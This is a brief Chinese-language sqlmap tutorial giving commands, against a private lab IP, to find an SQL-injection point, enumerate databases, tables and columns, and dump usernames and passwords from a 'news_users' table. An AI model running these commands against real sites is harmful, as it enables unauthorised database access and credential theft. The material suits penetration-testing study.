检测注入点：
-u：url缩写，指定url
sqlmap.py sqlmap -u 要检查网址url

获取数据库服务器上所有的数据库名称
--dbs 表示获取所有数据库名
sqlmap.py sqlmap -u 要检查的url --dbs

获取正在使用的数据库名
--current-db：表示查看当前数据库
sqlmap.py sqlmap -u http://192.168.83.108/news/show.php?id=55 --current-db

获取数据表名
-D:Database 指定数据库
--tables：获取所有数据表
sqlmap.py sqlmap -u http://192.168.83.108/news/show.php?id=55 -D news --tables

获取数据库表字段名
-D：指定数据库
-T:Table 指定表名
--columns 查询字段名
sqlmap.py sqlmap -u http://192.168.83.108/news/show.php?id=55 -D news -T news_users --columns

获取表中字段数据
-C 表示字段名
--dump 全部查询
sqlmap.py sqlmap -u http://192.168.83.108/news/show.php?id=55 -D news -T news_users -C username,password --dump
